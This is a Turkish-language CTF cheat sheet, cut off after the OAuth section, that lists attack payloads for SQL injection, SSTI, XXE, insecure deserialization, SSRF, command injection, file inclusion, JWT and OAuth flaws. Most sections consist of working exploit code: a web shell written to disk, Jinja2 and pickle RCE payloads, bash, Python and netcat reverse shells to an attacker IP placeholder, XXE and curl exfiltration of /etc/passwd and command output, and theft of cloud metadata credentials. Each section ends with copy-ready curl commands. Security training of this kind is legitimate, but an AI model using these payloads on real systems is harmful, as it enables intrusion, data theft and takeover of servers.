# Top 20 CTF Güvenlik Zafiyeti Ansiklopedisi
### DEFCON · Google CTF · HackTheBox · RealWorld Senaryoları

> **Kullanım Felsefesi:** Bu doküman "kopyala-yapıştır" için değil, **düşünme biçimi** kazandırmak için yazılmıştır. Her zafiyet için önce "neden var?" sorusunu anla. Geri kalanı gelir.

---

## İçindekiler

| # | Zafiyet | Kategori |
|---|---|---|
| 01 | SQL Injection (SQLi) | Web |
| 02 | Server-Side Template Injection (SSTI) | Web |
| 03 | XML External Entity (XXE) | Web |
| 04 | Insecure Deserialization | Web / App |
| 05 | Server-Side Request Forgery (SSRF) | Web |
| 06 | Command Injection (OS Injection) | Web |
| 07 | Local/Remote File Inclusion (LFI/RFI) | Web |
| 08 | JWT Attacks | Auth |
| 09 | OAuth / OIDC Misconfigurations | Auth |
| 10 | Prototype Pollution | JavaScript |
| 11 | Buffer Overflow (Stack-Based) | Binary |
| 12 | Format String Vulnerability | Binary |
| 13 | Use-After-Free (UAF) | Binary |
| 14 | Return-Oriented Programming (ROP) | Binary |
| 15 | Path Traversal / Directory Traversal | Web |
| 16 | Race Condition (TOCTOU) | Logic |
| 17 | LDAP / NoSQL Injection | Injection |
| 18 | DNS Rebinding | Network |
| 19 | Padding Oracle Attack | Crypto |
| 20 | Argument Injection | OS / Network |

---

---

# 01 — SQL Injection (SQLi)

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-89 — Improper Neutralization of Special Elements in SQL Commands
- **Alt Tipler:** Classic, Blind Boolean, Blind Time-Based, Error-Based, Out-of-Band, Second-Order
- **Etki:** Authentication Bypass, Data Exfiltration, RCE (xp_cmdshell), File Read/Write

## 2. Mental Model

Geliştirici şunu varsaydı:
```sql
-- Geliştirici aklında:
SELECT * FROM users WHERE username='[kullanici_adi]' AND password='[sifre]'
-- "Kullanıcı sadece metin yazar."
```

Sen ise SQL'i kapattın ve yeni bir komut yazdın:
```sql
-- Senin girdin: ' OR '1'='1
SELECT * FROM users WHERE username='' OR '1'='1' AND password=''
-- 1=1 her zaman true → tüm kayıtlar döner → giriş başarılı
```

**Kök Neden:** Veri ile kod aynı kanaldan geçiyor. Parameterized query / Prepared Statement kullanılmadı.

## 3. Keşif (Fingerprinting)

```bash
# Tek tırnak testi — hata mesajı veya davranış değişikliği
https://hedef.com/item?id=1'

# Beklenen hata sinyalleri:
# "You have an error in your SQL syntax..."
# "Warning: mysql_fetch_array()"
# "ORA-01756: quoted string not properly terminated"
# Sayfa içeriği tamamen değişti / boş döndü

# Otomatik tarama
sqlmap -u "https://hedef.com/item?id=1" --dbs --batch
```

**Fingerprint Tablosu:**

| Hata Mesajı | Veritabanı |
|---|---|
| `syntax error at or near` | PostgreSQL |
| `You have an error in your SQL syntax` | MySQL |
| `ORA-XXXXX` | Oracle |
| `Incorrect syntax near` | MSSQL |
| `SQLite3::Exception` | SQLite |

## 4. Exploitation

### Adım 1: Kolon Sayısını Bul
```sql
-- ORDER BY ile kolon sayısını bul (hata verene kadar artır)
id=1 ORDER BY 1--
id=1 ORDER BY 2--
id=1 ORDER BY 5-- ← hata verdi → 4 kolon var
```

### Adım 2: UNION ile Veri Çek
```sql
-- Hangi kolonlar görünür?
id=0 UNION SELECT NULL,NULL,NULL,NULL--

-- Görünen kolona veri yerleştir
id=0 UNION SELECT NULL,username,password,NULL FROM users--

-- Versiyon bilgisi
id=0 UNION SELECT NULL,@@version,NULL,NULL-- (MySQL/MSSQL)
id=0 UNION SELECT NULL,version(),NULL,NULL-- (PostgreSQL)
```

### Adım 3: Tüm Tabloları Listele
```sql
-- MySQL
id=0 UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--

-- PostgreSQL
id=0 UNION SELECT NULL,tablename,NULL,NULL FROM pg_tables WHERE schemaname='public'--
```

### Adım 4: Authentication Bypass
```
username: admin'--
password: [boş bırak]
-- Sorgu: SELECT * FROM users WHERE username='admin'--' AND password=''
-- -- ile password kontrolü yorum satırına alındı
```

### Adım 5: File Read/Write (MySQL)
```sql
-- Dosya oku (FILE privilege gerekli)
id=0 UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL,NULL--

-- Web shell yaz
id=0 UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--
```

## 5. Tıkanma Noktaları ve Bypass

```sql
-- Boşluk filtresi bypass:
SELECT/**/username/**/FROM/**/users
id=1%09UNION%09SELECT--   (%09 = tab)
id=1%0aUNION%0aSELECT--  (%0a = newline)

-- Büyük/küçük harf bypass:
UnIoN SeLeCt

-- Yorum bypass:
/*!UNION*/ /*!SELECT*/

-- Karakter encode:
' → %27
SPACE → /**/ veya + veya %20

-- WAF double encode:
' → %2527  (% → %25, sonra 27)
```

## 6. Blind SQLi — OOB Teknikleri

```sql
-- Boolean Blind (response değişiyorsa true/false anla)
id=1 AND 1=1--   ← normal sayfa
id=1 AND 1=2--   ← farklı sayfa → SQLi var!

-- Karakter karakter çek:
id=1 AND SUBSTRING(username,1,1)='a'--
id=1 AND ASCII(SUBSTRING(username,1,1))>64--

-- Time-Based Blind (response gelmiyorsa zaman ölç)
id=1; IF(1=1, SLEEP(5), 0)--     (MySQL)
id=1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- (PostgreSQL)

-- OOB (DNS exfiltration — MSSQL)
'; EXEC master..xp_dirtree '//SENIN_IP.burpcollaborator.net/a'--

-- SQLMap otomatik OOB:
sqlmap -u "URL" --technique=T --dbms=mysql --level=5 --risk=3
```

## 7. Checklist — 3 Komut

```bash
# 1. Hızlı manuel test
curl "https://hedef.com/item?id=1'"

# 2. SQLMap ile otomatik tarama
sqlmap -u "https://hedef.com/item?id=1" --dbs --batch --random-agent

# 3. Authentication bypass denemesi
curl -X POST https://hedef.com/login -d "username=admin'--&password=x"
```

---

---

# 02 — Server-Side Template Injection (SSTI)

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-94 — Code Injection via Template Engine
- **Alt Tipler:** Jinja2 (Python), Twig (PHP), Freemarker (Java), Smarty, Pebble, Velocity
- **Etki:** RCE, Dosya Okuma, Credential Çalma

## 2. Mental Model

Template engine'ler değişkenleri HTML içine gömmek için `{{ variable }}` gibi syntax kullanır. Geliştirici şunu yaptı:

```python
# TEHLİKELİ KOD:
template = "Merhaba " + request.args.get('name')
return render_template_string(template)

# Sen name parametresine şunu girdin: {{ 7*7 }}
# Çıktı: Merhaba 49
# Template motoru matematiksel ifadeyi hesapladı → kod çalıştırılıyor!
```

**Kök Neden:** Kullanıcı girdisi template string'in içine doğrudan concatenate edildi. Template motoru bunu "veri" değil "kod" olarak işledi.

## 3. Keşif (Fingerprinting)

```
# Tespit payload'ları — matematiksel ifade döndürürse SSTI var
{{7*7}}          → 49 (Jinja2/Twig)
${7*7}           → 49 (Freemarker)
<%= 7*7 %>       → 49 (ERB/Ruby)
#{7*7}           → 49 (Ruby interpolation)
*{7*7}           → 49 (Spring Expression)
{{7*'7'}}        → 49 (Jinja2) / 7777777 (Twig) ← motorı ayırt eder!
```

**Motor Belirleme Ağacı:**
```
{{7*7}} → 49?
├── Evet → {{7*'7'}} → ?
│   ├── 49 → Jinja2 (Python/Flask)
│   └── 7777777 → Twig (PHP)
└── Hayır → ${7*7} → 49?
    ├── Evet → Freemarker (Java) veya Mako
    └── Hayır → <%= 7*7 %> → Smarty / ERB
```

## 4. Exploitation

### Jinja2 (Python/Flask) — En Yaygın CTF Senaryosu

```python
# Adım 1: Python sınıflarına erişim yolu
''.__class__.__mro__[1].__subclasses__()
# Tüm Python sınıflarını listeler

# Adım 2: Subprocess veya os bul
{{''.__class__.__mro__[1].__subclasses__()[XXX]}}
# XXX = subprocess.Popen'ın index numarası (değişkendir, bulmak için döngü kur)

# Adım 3: Komut çalıştır — Kısa versiyon
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# En güvenilir payload:
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}}

# Dosya oku:
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].decode()}}
```

### Freemarker (Java)

```java
// RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

// Alternatif
${product.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke(product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

### Twig (PHP)

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

## 5. Tıkanma Noktaları ve Bypass

```python
# Nokta filtresi bypass (attr() fonksiyonu):
{{''|attr('__class__')|attr('__mro__')|...}}

# Alt çizgi filtresi bypass:
{{''.['__cla'+'ss__']}}
{{''.[\x5f\x5fclass\x5f\x5f]}}

# Büyük/küçük harf:
{{CONFIG}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}

# Sandbox'ta lipsum kullanımı (Jinja2):
{{lipsum.__globals__.os.popen('id').read()}}

# request nesnesi üzerinden:
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

## 6. Blind SSTI — OOB

```python
# DNS üzerinden exfiltrate:
{{config.__class__.__init__.__globals__['os'].popen('curl http://SENIN_IP/?x=$(id|base64)').read()}}

# Reverse shell:
{{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/SENIN_IP/4444 0>&1')}}
```

## 7. Checklist — 3 Komut

```bash
# 1. Tespit
curl "https://hedef.com/page?name={{7*7}}"

# 2. Motor belirleme
curl "https://hedef.com/page?name={{7*'7'}}"

# 3. RCE
curl "https://hedef.com/page?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
```

---

---

# 03 — XML External Entity (XXE)

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-611 — Improper Restriction of XML External Entity Reference
- **Alt Tipler:** Classic XXE, Blind XXE, OOB XXE, Error-Based XXE, SVG/DOCX/XLSX XXE
- **Etki:** Dosya Okuma (/etc/passwd, kaynak kod, credentials), SSRF, RCE (özel durumlarda)

## 2. Mental Model

XML'in çok eski bir özelliği var: "External Entity." Bir XML belgesinin dışarıdaki bir kaynağa referans vermesine izin verir. Geliştirici bu özelliği devre dışı bırakmayı unuttuysa:

```xml
<!-- Sen bu XML'i sunucuya gönderdin: -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>

<!-- Sunucu XML'i parse etti ve &xxe; yerine /etc/passwd içeriğini koydu -->
<!-- Sonuç: /etc/passwd içeriği sana döndü -->
```

**Kök Neden:** XML parser'ı external entity desteği açık bırakıldı.

## 3. Keşif (Fingerprinting)

```
# XML kabul eden endpoint'leri ara:
- Content-Type: application/xml veya text/xml
- SOAP servisleri (genellikle /ws, /soap, /api/v1/xml)
- Dosya upload (SVG, DOCX, XLSX, PDF — hepsi XML bazlı!)
- GraphQL'de XML input
- JSON yerine XML destekleyen her endpoint

# Hata bazlı tespit:
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY test "test">]><foo>&test;</foo>
# "test" döndüyse → entity parsing aktif → XXE dene
```

## 4. Exploitation

### Classic XXE — Dosya Okuma

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

### SSRF via XXE (İç Ağa Erişim)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>
```

### PHP Kaynak Kodu Okuma (base64)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root><data>&xxe;</data></root>
```

### SVG Üzerinden XXE (Dosya Upload)

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

## 5. Tıkanma Noktaları ve Bypass

```xml
<!-- UTF-16 encoding bypass -->
<!-- Dosyayı UTF-16 LE olarak encode et -->
iconv -f UTF-8 -t UTF-16LE payload.xml > payload_utf16.xml

<!-- DOCTYPE engellendi → Parameter Entity kullan -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://SENIN_IP/?x=%file;'>">
  %eval;
  %exfil;
]>
<foo>bar</foo>

<!-- JSON endpoint ama XML dene (Content-Type değiştir) -->
Content-Type: application/xml
```

## 6. Blind XXE — OOB

```xml
<!-- Kendi sunucunda DTD dosyası hazırla: evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://SENIN_IP:8080/?content=%file;'>">
%eval;
%exfil;

<!-- Hedef sunucuya gönder: -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://SENIN_IP:8080/evil.dtd">
  %remote;
]>
<foo>bar</foo>

<!-- Kendi sunucunda dinle: -->
python3 -m http.server 8080
```

## 7. Checklist — 3 Komut

```bash
# 1. XML endpoint bul ve test et
curl -X POST https://hedef.com/api -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY test "XXETEST">]><root>&test;</root>'

# 2. Dosya oku
curl -X POST https://hedef.com/api -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# 3. SVG upload denemesi
curl -X POST https://hedef.com/upload -F "file=@evil.svg;type=image/svg+xml"
```

---

---

# 04 — Insecure Deserialization

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-502 — Deserialization of Untrusted Data
- **Alt Tipler:** Java (ysoserial), Python (pickle), PHP (unserialize), .NET (BinaryFormatter), Ruby (Marshal)
- **Etki:** RCE, Privilege Escalation, DoS

## 2. Mental Model

Serialization: Nesneyi (object) byte dizisine çevirme. Deserialization: Byte dizisini tekrar nesneye çevirme. Sorun şu:

```python
# Python pickle örneği
import pickle

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))  # Nesne oluşturulurken bu çalışır!

payload = pickle.dumps(Exploit())
pickle.loads(payload)  # → id komutu çalışır
```

Uygulama dışarıdan gelen serialized datayı güvensizce deserialize etti. Nesne oluşturma sürecinde tanımlı "magic method"lar tetiklendi.

## 3. Keşif (Fingerprinting)

```
Java: 
- rO0AB... ile başlayan base64 → "aced0005" hex magic bytes
- Content-Type: application/x-java-serialized-object
- HTTP parametre veya cookie'de rO0= gördün mü?

Python Pickle:
- \x80\x02 veya \x80\x03 ile başlayan binary
- Cookie veya parametre base64 çözülünce bu bytes çıkıyorsa

PHP:
- O:X:"ClassName":Y:{...} formatı (O = object, X = isim uzunluğu)
- Cookie veya hidden field'da base64 çözülünce bu çıkıyorsa

.NET:
- AAEAAAD///// ile başlayan base64
- ViewState parametresi (ASP.NET Web Forms)
```

## 4. Exploitation

### Python Pickle RCE

```python
import pickle, os, base64

class RCE(object):
    def __reduce__(self):
        cmd = "bash -i >& /dev/tcp/SENIN_IP/4444 0>&1"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)

# Bunu cookie veya parametre olarak gönder:
curl https://hedef.com/ -b "session=PAYLOAD_BURAYA"
```

### Java Deserialization — ysoserial

```bash
# Java 11 ile çalıştır (Java 21 uyumsuz!)
java -jar ysoserial.jar CommonsCollections5 'id' > payload.bin

# Hedef CommonsCollections kütüphanesini kullanıyor mu?
# pom.xml, manifest, /WEB-INF/lib/*.jar kontrol et

# Payload chain'leri dene (sırayla):
CommonsCollections5
CommonsCollections6
CommonsCollections2
Spring1
Groovy1

# Payload boyutu kontrol (ASLA 0 byte olmamalı):
wc -c payload.bin
```

### PHP Unserialize

```php
<?php
class Config {
    public $data;
    public function __destruct() {
        eval($this->data); // Magic method!
    }
}

// Payload oluştur:
$obj = new Config();
$obj->data = 'system("id");';
echo base64_encode(serialize($obj));
// O:6:"Config":1:{s:4:"data";s:13:"system("id")";}
```

## 5. Tıkanma Noktaları

```python
# Pickle HMAC imzalı ise → imzayı kırmak gerekir (brute force veya key leak)
# Signature: HMAC-SHA256(secret_key, payload)

# PHP'de __wakeup() güvenlik kontrolü varsa:
# __destruct() dene, farklı class'ları dene

# Java'da gadget chain yok mu?
# JDK7u21, JDK8u20 gibi JRE chain'leri dene
# rome, spring-core, beanutils kütüphanelerini kontrol et
```

## 6. Blind Deserialization — OOB

```python
# Önce DNS ile payload çalışıyor mu test et
class DNSTest(object):
    def __reduce__(self):
        return (os.system, ('curl http://SENIN_IP:8080/test',))

# Netcat'te hit geldi mi kontrol et
nc -lvnp 8080
```

## 7. Checklist — 3 Komut

```bash
# 1. Cookie/parametre değerini base64 çöz, magic bytes kontrol et
echo "COOKIE_VALUE" | base64 -d | xxd | head -5
# rO0A → Java, \x80\x02 → Python Pickle, O: → PHP

# 2. Java için ysoserial
java -jar ysoserial.jar CommonsCollections5 'curl http://SENIN_IP' > payload.bin

# 3. Payload gönder
curl https://hedef.com/ -b "session=$(cat payload.bin | base64 -w0)"
```

---

---

# 05 — Server-Side Request Forgery (SSRF)

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-918 — Server-Side Request Forgery
- **Alt Tipler:** Basic SSRF, Blind SSRF, Semi-Blind, Protocol Smuggling
- **Etki:** İç Ağ Keşfi, Metadata API Erişimi (AWS/GCP/Azure), Firewall Bypass, RCE

## 2. Mental Model

Uygulama, senin adına URL'leri fetch ediyor. URL'yi sen veriyorsun. Ama sunucu bu isteği kendi kimliğiyle yapıyor:

```
Sen → "Şu URL'deki resmi yükle: http://169.254.169.254/latest/meta-data/iam/security-credentials/"
Sunucu → AWS Metadata API'ye istek yapar
AWS → "Tabii, işte IAM credentials: aws_access_key_id=..."
Sunucu → Cevabı sana döndürür
```

**Kök Neden:** Sunucu fetch edeceği URL'yi kullanıcıdan alıyor ama filtrelemiyor.

## 3. Keşif (Fingerprinting)

```
# SSRF için hedef parametreler:
- url=, uri=, path=, src=, redirect=, next=, callback=, image=
- webhook=, proxy=, load=, fetch=, target=, dest=

# SSRF sinyalleri:
- "Resim URL'si girin" → url parametresi
- "Webhook URL'si ekle" → dış adres callback
- PDF/Screenshot servisi → URL alıp işliyor
- Import/Export → dış kaynaktan veri çekiyor
- "Site Preview" → URL'yi render ediyor
```

## 4. Exploitation

### Adım 1: Temel SSRF Testi

```bash
# Kendi sunucuna istek geldiyse SSRF var
nc -lvnp 8080
curl "https://hedef.com/fetch?url=http://SENIN_IP:8080/test"
```

### Adım 2: AWS Metadata (IMDSv1)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
```

### Adım 3: GCP Metadata

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header gerekli: Metadata-Flavor: Google
```

### Adım 4: İç Ağ Tarama

```bash
# Python ile port scan payload'ları üret
for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
  echo "http://127.0.0.1:$port"
done

# Redis'e erişim varsa:
url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html

# Elasticsearch:
url=http://127.0.0.1:9200/_cat/indices
```

## 5. Bypass Teknikleri

```bash
# localhost bypass:
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/          # IPv6
http://127.0.0.1.nip.io/
http://localhost/

# IP obfuscation:
http://2130706433/    # 127.0.0.1 decimal
http://0x7f000001/    # hex
http://0177.0.0.1/    # octal

# DNS rebinding:
http://ssrf.flaws.cloud/  # her sorguya farklı IP döndüren domain

# URL schema bypass:
file:///etc/passwd
gopher://127.0.0.1:6379/...
dict://127.0.0.1:6379/info
```

## 6. Blind SSRF — OOB

```bash
# Burp Collaborator veya interactsh kullan
curl "https://hedef.com/fetch?url=http://UNIQUE_ID.oast.fun/"

# interactsh kur ve kullan
interactsh-client
# → abcdef.oast.fun adresini ver, DNS hit'i izle
```

## 7. Checklist — 3 Komut

```bash
# 1. Temel SSRF testi
curl "https://hedef.com/?url=http://SENIN_IP:8080/"

# 2. AWS metadata
curl "https://hedef.com/?url=http://169.254.169.254/latest/meta-data/"

# 3. İç ağ Redis/Memcached tara
curl "https://hedef.com/?url=http://127.0.0.1:6379/"
```

---

---

# 06 — Command Injection (OS Injection)

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-78 — OS Command Injection
- **Alt Tipler:** Classic, Blind (Time-Based), OOB
- **Etki:** RCE, Dosya Okuma/Yazma, Lateral Movement

## 2. Mental Model

```bash
# Geliştirici şunu yazdı:
os.system("ping -c 1 " + user_input)

# Normal girdi: 8.8.8.8
# Çalışan komut: ping -c 1 8.8.8.8

# Senin girdin: 8.8.8.8; id
# Çalışan komut: ping -c 1 8.8.8.8; id
# ; sonraki komutu çalıştırır
```

## 3. Keşif (Fingerprinting)

```
# OS komutunun arkasına eklenebilecek her parametre:
- host=, ip=, domain=, target=, name=, filename=, cmd=
- Ping/traceroute servisleri
- DNS lookup, whois servisleri
- Email gönderme (From adresi)
- Dosya dönüştürme araçları (ImageMagick, FFmpeg)
- PDF generator
```

## 4. Exploitation

### Ayırıcı Karakterler

```bash
; id          # Sıralı çalıştır
| id          # Pipe
|| id         # İlki başarısız olursa çalıştır
&& id         # İlki başarılı olursa çalıştır
& id          # Arka planda çalıştır
`id`          # Backtick — komut substitution
$(id)         # Command substitution
%0a id        # Newline (URL encoded)
```

### Reverse Shell

```bash
# Bash
bash -i >& /dev/tcp/SENIN_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("SENIN_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat
nc -e /bin/bash SENIN_IP 4444
# veya (eski nc için):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc SENIN_IP 4444 >/tmp/f
```

## 5. Bypass Teknikleri

```bash
# Boşluk filtresi:
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'\x20';cat${X}/etc/passwd

# Blacklist bypass (örn: "cat" yasaksa):
c''at /etc/passwd
c"a"t /etc/passwd
/bin/c?t /etc/passwd
$(printf '\x63\x61\x74') /etc/passwd

# Slash yasaksa:
${HOME:0:1}  # / karakteri HOME=/root
echo$IFS${PATH:0:1}etc${PATH:0:1}passwd | xargs cat
```

## 6. Blind Command Injection — OOB

```bash
# DNS exfiltration
; nslookup $(whoami).SENIN_IP.nip.io
; curl http://SENIN_IP:8080/$(whoami)

# Time-based (5 saniye gecikme gelirse komut çalıştı)
; sleep 5
; ping -c 5 127.0.0.1

# Dosyaya yaz, sonra web üzerinden oku
; id > /var/www/html/out.txt
curl http://hedef.com/out.txt
```

## 7. Checklist — 3 Komut

```bash
# 1. Basit test
curl "https://hedef.com/ping?host=127.0.0.1;id"

# 2. OOB test (blind ise)
curl "https://hedef.com/ping?host=127.0.0.1;curl+http://SENIN_IP:8080/test"

# 3. Reverse shell
curl "https://hedef.com/ping?host=127.0.0.1;bash+-i+>%26+/dev/tcp/SENIN_IP/4444+0>%261"
```

---

---

# 07 — Local/Remote File Inclusion (LFI/RFI)

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-98 — PHP Remote File Inclusion / CWE-22 — Path Traversal
- **Alt Tipler:** LFI (yerel dosya), RFI (uzak dosya), Log Poisoning, PHP Wrappers
- **Etki:** Kaynak Kod Okuma, Credential Çalma, RCE (log poisoning + LFI)

## 2. Mental Model

```php
// PHP kodu:
include($_GET['page'] . '.php');

// Normal kullanım:
?page=home → home.php dahil edilir

// Senin girdin:
?page=../../../etc/passwd%00   ← null byte ile .php uzantısını kes (eski PHP)
?page=php://filter/convert.base64-encode/resource=config  ← kaynak kodu oku
```

## 3. Exploitation

### Klasik Path Traversal

```bash
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd   # Çift nokta bypass
?page=%2e%2e%2f%2e%2e%2fetc/passwd  # URL encode
```

### PHP Wrapper — Kaynak Kodu Oku

```bash
?page=php://filter/convert.base64-encode/resource=index
?page=php://filter/read=string.rot13/resource=config
# Çıktıyı base64 çöz → PHP kaynak kodu
```

### Log Poisoning → RCE

```bash
# Adım 1: Log dosyasına PHP kodu enjekte et (User-Agent üzerinden)
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://hedef.com/

# Adım 2: Log dosyasını LFI ile dahil et
?page=../../../../var/log/apache2/access.log&cmd=id

# Yaygın log dosyaları:
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log  (SSH login denemeleri)
/proc/self/fd/1
```

### PHP Session Poisoning

```bash
# Adım 1: Session'a PHP kodu yaz
curl https://hedef.com/ -b "PHPSESSID=test" -d "username=<?php system(\$_GET['cmd']); ?>"

# Adım 2: Session dosyasını LFI ile dahil et
?page=../../../../tmp/sess_test&cmd=id
```

## 5. Tıkanma ve Bypass

```bash
# Uzantı ekleniyor (.php):
?page=../../../etc/passwd%00   # Null byte (PHP < 5.3.4)
?page=../../../etc/passwd/./   # Trailing slash

# path filtreleniyor:
....//....//  yerine  ....\/....\/

# input_file_path basename() kullanıyor:
?page=http://SENIN_IP/shell   # RFI (allow_url_include=On gerekli)
```

## 7. Checklist — 3 Komut

```bash
# 1. LFI test
curl "https://hedef.com/?page=../../../../etc/passwd"

# 2. PHP kaynak okuma
curl "https://hedef.com/?page=php://filter/convert.base64-encode/resource=index"

# 3. Log poisoning setup
curl -H "User-Agent: <?php system(\$_GET['c']); ?>" http://hedef.com/
curl "https://hedef.com/?page=../../../../var/log/apache2/access.log&c=id"
```

---

---

# 08 — JWT Attacks

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-347 — Improper Verification of Cryptographic Signature
- **Alt Tipler:** None Algorithm, Algorithm Confusion (RS256→HS256), Weak Secret, Kid Injection, JWK Injection
- **Etki:** Authentication Bypass, Privilege Escalation

## 2. Mental Model

JWT yapısı: `header.payload.signature` (hepsi base64)

```json
// Header:
{"alg": "HS256", "typ": "JWT"}
// Payload:
{"user": "guest", "role": "user"}
// Signature: HMAC-SHA256(header+payload, secret_key)
```

Zafiyet: Sunucu, header'daki `alg` değerine güveniyor.

```json
// Sen değiştirdin:
{"alg": "none", "typ": "JWT"}
{"user": "admin", "role": "admin"}
// Signature: (boş)
// Bazı kütüphaneler alg=none'ı kabul eder → İmzasız token geçerli!
```

## 4. Exploitation

### Attack 1: None Algorithm

```python
import base64, json

header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"user":"admin","role":"admin","exp":9999999999}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."  # Boş signature

curl https://hedef.com/api/admin -H "Authorization: Bearer $token"
```

### Attack 2: Weak Secret Bruteforce

```bash
# hashcat ile brute force
hashcat -a 0 -m 16500 jwt_token.txt wordlist.txt

# john ile
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt

# jwt_tool ile
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt
```

### Attack 3: RS256 → HS256 Confusion

```python
# Sunucu RS256 kullanıyor (public key ile doğrulama)
# Ama HS256'ya geçersen, public key ile HMAC imzalanmış token'ı kabul eder!

# Public key'i al (genellikle /jwks.json veya /.well-known/jwks.json)
curl https://hedef.com/.well-known/jwks.json

# jwt_tool ile:
python3 jwt_tool.py TOKEN -X k -pk public.pem
```

### Attack 4: Kid SQL/Path Injection

```json
// kid = key id, sunucu bunu kullanarak anahtar dosyasını yükler
{"alg": "HS256", "kid": "../../dev/null"}
// kid'e ../../../etc/passwd girerseniz ve dosyayı key olarak kullanıyorsa:
{"alg": "HS256", "kid": "../../dev/null"}
// /dev/null boş → boş string key → imzalamak kolay
```

## 7. Checklist — 3 Komut

```bash
# 1. Token decode et
echo "PAYLOAD_KISMI" | base64 -d 2>/dev/null | python3 -m json.tool

# 2. None attack dene
python3 jwt_tool.py TOKEN -X a

# 3. Weak secret brute force
hashcat -a 0 -m 16500 token.txt rockyou.txt
```

---

---

# 09 — OAuth / OIDC Misconfigurations

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-601 — Open Redirect / CWE-352 — CSRF / Auth Logic Flaws
- **Alt Tipler:** redirect_uri bypass, state parameter bypass, implicit flow token theft, account takeover
- **Etki:** Account Takeover, Privilege Escalation

## 2. Mental Model

OAuth akışı: Sen → Uygulama → "Google ile giriş yap" → Google → Token → redirect_uri'ye gönder

Zafiyet: `redirect_uri` tam olarak doğrulanmıyorsa token başka yere gider.

## 4. Exploitation

```bash
# redirect_uri bypass denemeleri:
?redirect_uri=https://hedef.com@SENIN_SITE.com   # @ bypass
?redirect_uri=https://hedef.com.SENIN_SITE.com    # subdomain
?redirect_uri=https://hedef.com/callback/../redirect?url=SENIN_SITE.com

# state CSRF:
# state parametresi yoksa veya doğrulanmıyorsa:
# Kurban linke tıklarsa senin hesabınla kurbanın hesabı birleşir (account linking)

# Token sızdırma (Referrer header):
# redirect_uri içinde bir sayfaya yönlendirme varsa
# fragment (#access_token=...) Referrer ile sızabilir
```

## 7. Checklist — 3 Adım

```bash
